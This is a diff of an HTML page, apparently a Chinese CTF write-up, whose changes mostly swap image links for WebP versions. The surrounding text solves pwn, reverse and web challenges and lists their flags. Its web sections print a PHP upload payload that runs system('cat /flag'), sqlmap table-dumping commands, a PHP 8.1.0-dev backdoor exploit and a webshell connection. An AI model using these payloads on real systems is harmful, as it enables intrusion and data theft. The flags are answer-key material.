-<p><img alt="ret2text-flag" src="../../../assets/ret2text-flag.png" /></p>
+<p><img alt="ret2text-flag" src="../../../assets/ret2text-flag.png.webp" loading="lazy" decoding="async" width="894" height="433"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{300c17b3-83e5-4f37-8ce3-9024890dd069}</p>
@@ -4013,7 +4011,7 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 </span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></code></pre></div>
 <p>运行结果如下</p>
-<p><img alt="mips-flag" src="../../../assets/mips-flag.png" /></p>
+<p><img alt="mips-flag" src="../../../assets/mips-flag.png.webp" loading="lazy" decoding="async" width="821" height="433"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{89f7263f-202a-4ecf-b94a-d5ba7b60ec85}</p>
@@ -4031,16 +4029,16 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 <p>password: Y0u_are_gr3at!</p>
 </blockquote>
 <p>登录页面，显示如下</p>
-<p><img alt="ez_search-logined" src="../../../assets/ez_search-logined.png" /></p>
+<p><img alt="ez_search-logined" src="../../../assets/ez_search-logined.png.webp" loading="lazy" decoding="async" width="2556" height="1495"></p>
 <p>查看源代码中<strong>rain.js</strong>发现flag</p>
-<p><img alt="ez_search-flag" src="../../../assets/ez_search-flag.png" /></p>
+<p><img alt="ez_search-flag" src="../../../assets/ez_search-flag.png.webp" loading="lazy" decoding="async" width="622" height="47"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{ec55b403-7702-4181-8d01-5591986ae1a9}</p>
 </blockquote>
 <h3 id="ez_2">ez_信息收集2<a class="headerlink" href="#ez_2" title="Permanent link">&para;</a></h3>
 <p>这题是我在ipad上做的，还是打开<strong>robots.txt</strong>，但这次内容变成了一段话带一堆文件名</p>
-<p><img alt="ez_search2-robots" src="../../../assets/ez_search2-robots.png" /></p>
+<p><img alt="ez_search2-robots" src="../../../assets/ez_search2-robots.png.webp" loading="lazy" decoding="async" width="1145" height="495"></p>
 <p>我们编写python脚本</p>
 <ul>
 <li>读取文件列表</li>
@@ -4080,16 +4078,16 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 </span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 </span></code></pre></div>
 <p>返回内容</p>
-<p><img alt="ez_search2-password" src="../../../assets/ez_search2-password.PNG" /></p>
+<p><img alt="ez_search2-password" src="../../../assets/ez_search2-password.PNG.webp" loading="lazy" decoding="async" width="2360" height="1640"></p>
 <p>登录后还是flagrain,查看源码</p>
-<p><img alt="ez_search2-flag" src="../../../assets/ez_search2-flag.png" /></p>
+<p><img alt="ez_search2-flag" src="../../../assets/ez_search2-flag.png.webp" loading="lazy" decoding="async" width="696" height="42"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{5533a9df-b006-476c-a76e-2b8773ed1315}</p>
 </blockquote>
 <h3 id="_5">水果忍者<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <p>查看源码<strong>all.js</strong>在开头发现flag</p>
-<p><img alt="ninja-flag" src="../../../assets/ninja-flag.png" /></p>
+<p><img alt="ninja-flag" src="../../../assets/ninja-flag.png.webp" loading="lazy" decoding="async" width="585" height="156"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{9f140897-40ef-4788-b040-ffd61e271ff3}</p>
@@ -4108,7 +4106,7 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 </span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="p">}</span>
 </span></code></pre></div>
 <p>可知cat、system等一系列命令都被过滤了，我们构造如下请求绕过</p>
-<p><img alt="ez_RCe" src="../../../assets/ez_RCe.png" /></p>
+<p><img alt="ez_RCe" src="../../../assets/ez_RCe.png.webp" loading="lazy" decoding="async" width="2557" height="404"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{645df240-2943-4431-90d2-1b4da323ecd6}</p>
@@ -4131,9 +4129,9 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <p>PHP/8.1.0-dev</p>
 </blockquote>
 <p>可知存在后门命令执行漏洞，放入重放器中进行攻击,添加<strong>User-Agentt</strong>字段</p>
-<p><img alt="ikun-ls" src="../../../assets/ikun-ls.png" /></p>
-<p><img alt="ikun-fake_flag" src="../../../assets/ikun-fake_flag.png" /></p>
-<p><img alt="ikun-flag" src="../../../assets/ikun-flag.png" /></p>
+<p><img alt="ikun-ls" src="../../../assets/ikun-ls.png.webp" loading="lazy" decoding="async" width="1455" height="422"></p>
+<p><img alt="ikun-fake_flag" src="../../../assets/ikun-fake_flag.png.webp" loading="lazy" decoding="async" width="1367" height="425"></p>
+<p><img alt="ikun-flag" src="../../../assets/ikun-flag.png.webp" loading="lazy" decoding="async" width="2560" height="536"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{2fbfe1fd-fc37-42f7-bbd3-fb83d4f9ac92}</p>
@@ -4167,7 +4165,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="p">}</span>
 </span></code></pre></div>
 <p>可知是弱比较和数组绕过，构造如下请求</p>
-<p><img alt="array_master-flag" src="../../../assets/array_master-flag.png" /></p>
+<p><img alt="array_master-flag" src="../../../assets/array_master-flag.png.webp" loading="lazy" decoding="async" width="2557" height="655"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{72a0813e-d6fc-419c-9a1f-64c25e05509c}</p>
@@ -4177,7 +4175,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <h5 id="cf12">我是c语言大佬，当年没有下载原神的那批人，现在f12和右键都被我嗨掉了<a class="headerlink" href="#cf12" title="Permanent link">&para;</a></h5>
 </blockquote>
 <p><strong>f12</strong>和<strong>右键</strong>无法使用,但是我们还可以使用<strong>Ctrl+U</strong></p>
-<p><img alt="qd-first" src="../../../assets/qd-first.png" /></p>
+<p><img alt="qd-first" src="../../../assets/qd-first.png.webp" loading="lazy" decoding="async" width="691" height="89"></p>
 <p>进入第二关</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x">if ($_SERVER["REQUEST_METHOD"] == "GET") {    </span>
 </span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="x">        $yuanshen = $_GET["yuanshen"];  </span>
@@ -4199,7 +4197,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <p>抓个包试试吧</p>
 </blockquote>
 <p>我们不使用burpsuite直接f12查看网络发现(我在抓综合渗透题的包时也发现了这个flag，暴打出题人)</p>
-<p><img alt="qd-flag" src="../../../assets/qd-flag.png" /></p>
+<p><img alt="qd-flag" src="../../../assets/qd-flag.png.webp" loading="lazy" decoding="async" width="687" height="38"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{Yuan_1ai_N1_y3_W4n_yUAn5HeN}</p>
@@ -4226,15 +4224,15 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="x">&lt;script language="php"&gt;phpinfo();&lt;/script&gt;</span>
 </span></code></pre></div>
 <p>上传，再次查看路径，成功</p>
-<p><img alt="collector-info" src="../../../assets/collector-info.png" /></p>
+<p><img alt="collector-info" src="../../../assets/collector-info.png.webp" loading="lazy" decoding="async" width="2560" height="1409"></p>
 <p>构造如下语句,查看文件目录</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">&lt;script language="php"&gt;system("ls /")&lt;/script&gt;</span>
 </span></code></pre></div>
-<p><img alt="collector-nav" src="../../../assets/collector-nav.png" /></p>
+<p><img alt="collector-nav" src="../../../assets/collector-nav.png.webp" loading="lazy" decoding="async" width="1175" height="145"></p>
 <p>构造语句，取得flag</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">&lt;script language="php"&gt;system("cat /flag")&lt;/script&gt;</span>
 </span></code></pre></div>
-<p><img alt="collector-flag" src="../../../assets/collector-flag.png" /></p>
+<p><img alt="collector-flag" src="../../../assets/collector-flag.png.webp" loading="lazy" decoding="async" width="593" height="49"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{bb0a3025-5764-4b36-95de-b106d0df38c5}</p>
@@ -4311,7 +4309,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a><span class="x">}</span>
 </span></code></pre></div>
 <p>结合<strong>dirsearch</strong>的结果，查看<strong>/user.php</strong>文件,得到flag</p>
-<p><img alt="web1-flag" src="../../../assets/web1-flag.png" /></p>
+<p><img alt="web1-flag" src="../../../assets/web1-flag.png.webp" loading="lazy" decoding="async" width="1191" height="543"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag1{17013e65-4e6f-b9f6-a308-ce3878e8212c}</p>
@@ -4362,27 +4360,27 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <p>sqlmap -u url//api/removeBlog.php?id=3 -D ctfer --tables</p>
 </blockquote>
 <p>获得表名</p>
-<p><img alt="web2-dbs" src="../../../assets/web2-dbs.png" /></p>
+<p><img alt="web2-dbs" src="../../../assets/web2-dbs.png.webp" loading="lazy" decoding="async" width="222" height="177"></p>
 <p>构造</p>
 <blockquote>
 <p>sqlmap -u url//api/removeBlog.php?id=3 -D ctfer -T flag --columns</p>
 </blockquote>
 <p>得到</p>
-<p><img alt="web2-col" src="../../../assets/web2-col.png" /></p>
+<p><img alt="web2-col" src="../../../assets/web2-col.png.webp" loading="lazy" decoding="async" width="330" height="193"></p>
 <p>构造</p>
 <blockquote>
 <p>sqlmap -u url//api/removeBlog.php?id=3 -D ctfer -T flag -C flag --dump</p>
 </blockquote>
 <p>获取字段<strong>flag</strong>中的内容，得到</p>
-<p><img alt="web2-flag" src="../../../assets/web2-flag.png" /></p>
+<p><img alt="web2-flag" src="../../../assets/web2-flag.png.webp" loading="lazy" decoding="async" width="607" height="210"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag2{83fc5b4e-d70a-be97-0ec2-6cdde9eb1b30}</p>
 </blockquote>
 <h3 id="webflag3">web综合渗透靶场flag3<a class="headerlink" href="#webflag3" title="Permanent link">&para;</a></h3>
 <p>通过sqlmap在ctfer下的user表中获取到username和password</p>
-<p><img alt="web-user-tab" src="../../../assets/web-user-tab.png" /></p>
-<p><img alt="web-user-item" src="../../../assets/web-user-item.png" /></p>
+<p><img alt="web-user-tab" src="../../../assets/web-user-tab.png.webp" loading="lazy" decoding="async" width="359" height="266"></p>
+<p><img alt="web-user-item" src="../../../assets/web-user-item.png.webp" loading="lazy" decoding="async" width="628" height="252"></p>
 <p>发现管理员密码被加密，使用<strong>SSRF</strong>漏洞获取源码</p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="cp">&lt;?php</span>
 </span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">session_start</span><span class="p">();</span>
@@ -4462,7 +4460,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="x">$uploadDir = dirname(__FILE__)."/../upload/";</span>
 </span></code></pre></div>
 <p>得到管理员密码，登录，发现在管理员页面下，文章上传处图片上传开启，尝试文件包含，注入一句话木马，蚁剑连接成功。</p>
-<p><img alt="web3-antsword" src="../../../assets/web3-antsword.png" /></p>
+<p><img alt="web3-antsword" src="../../../assets/web3-antsword.png.webp" loading="lazy" decoding="async" width="1542" height="1044"></p>
 <p>在根目录尝试查看flag失败，权限不足。不会提权，试了一天，遂放弃。</p>
 <h3 id="webflag5">web综合渗透靶场flag5<a class="headerlink" href="#webflag5" title="Permanent link">&para;</a></h3>
 <blockquote>
@@ -4488,7 +4486,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 <h2 id="reverse">Reverse<a class="headerlink" href="#reverse" title="Permanent link">&para;</a></h2>
 <h3 id="ez_xor">ez_xor<a class="headerlink" href="#ez_xor" title="Permanent link">&para;</a></h3>
 <p>直接丢入IDA查看main函数</p>
-<p><img alt="ez_xor-main" src="../../../assets/ez_xor-main.png" /></p>
+<p><img alt="ez_xor-main" src="../../../assets/ez_xor-main.png.webp" loading="lazy" decoding="async" width="510" height="386"></p>
 <p>逻辑很简单，输入flag然后对flag的字符与其下标异或，编写脚本</p>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">enc</span> <span class="o">=</span> <span class="s1">'fmcd</span><span class="se">\x7F</span><span class="s1">qnn{V;xSLQi|pun'</span>
 </span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">res</span> <span class="o">=</span> <span class="s1">''</span>
@@ -4499,14 +4497,14 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
 </span></code></pre></div>
 <p>结果如下</p>
-<p><img alt="ez_xor-flag" src="../../../assets/ez_xor-flag.png" /></p>
+<p><img alt="ez_xor-flag" src="../../../assets/ez_xor-flag.png.webp" loading="lazy" decoding="async" width="255" height="35"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{this_1s_A_flag}</p>
 </blockquote>
 <h3 id="ez_upx">ez_upx<a class="headerlink" href="#ez_upx" title="Permanent link">&para;</a></h3>
 <p>同标题，先upx解包，再进入ida，这次我们先看汇编，发现了个很神奇的地方。</p>
-<p><img alt="ez_upx" src="../../../assets/ez_upx.png" /></p>
+<p><img alt="ez_upx" src="../../../assets/ez_upx.png.webp" loading="lazy" decoding="async" width="473" height="68"></p>
 <p>传入rax的值，写作小端法，高位变成</p>
 <blockquote>
 <p>66 6C 61 67</p>
@@ -4564,7 +4562,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-23-43"><a id="__codelineno-23-43" name="__codelineno-23-43" href="#__codelineno-23-43"></a><span class="p">}</span>
 </span></code></pre></div>
 <p>得到</p>
-<p><img alt="try_reverse_it" src="../../../assets/try_reverse_it.png" /></p>
+<p><img alt="try_reverse_it" src="../../../assets/try_reverse_it.png.webp" loading="lazy" decoding="async" width="363" height="35"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{Y0u_5eem_1ike4pro_revers3r}</p>
@@ -4606,14 +4604,14 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
 </span></code></pre></div>
 <p>结果如下</p>
-<p><img alt="python-flag" src="../../../assets/python-flag.png" /></p>
+<p><img alt="python-flag" src="../../../assets/python-flag.png.webp" loading="lazy" decoding="async" width="432" height="33"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{Y0u_@r3_R3@l1y_G0OD_@t_Pyth0n!}</p>
 </blockquote>
 <h3 id="ez_maze">ez_maze<a class="headerlink" href="#ez_maze" title="Permanent link">&para;</a></h3>
 <p>打开IDA，观察main函数</p>
-<p><img alt="ez_maze-main" src="../../../assets/ez_maze-main.png" /></p>
+<p><img alt="ez_maze-main" src="../../../assets/ez_maze-main.png.webp" loading="lazy" decoding="async" width="795" height="970"></p>
 <p>结合标题发现这是一个走迷宫的程序，<strong>v6</strong>为6x5的地图，<strong>wasd</strong>为上下左右，<strong>@</strong>为起点，<strong>#</strong>为终点</p>
 <div class="language-c highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1">//mazemap</span>
 </span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="err">@</span><span class="mo">0111</span>
@@ -4624,7 +4622,7 @@ mXBocOeJiOacrOW+iOWNsemZqeWViiEhIQ==</p>
 </span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="mo">00</span><span class="err">#</span><span class="mo">01</span>
 </span></code></pre></div>
 <p>可以知道路径为<strong>dssdsdssa</strong>，运行程序验证成功</p>
-<p><img alt="ez_maze-flag" src="../../../assets/ez_maze-flag.png" /></p>
+<p><img alt="ez_maze-flag" src="../../../assets/ez_maze-flag.png.webp" loading="lazy" decoding="async" width="980" height="173"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{dssdsdssa}</p>
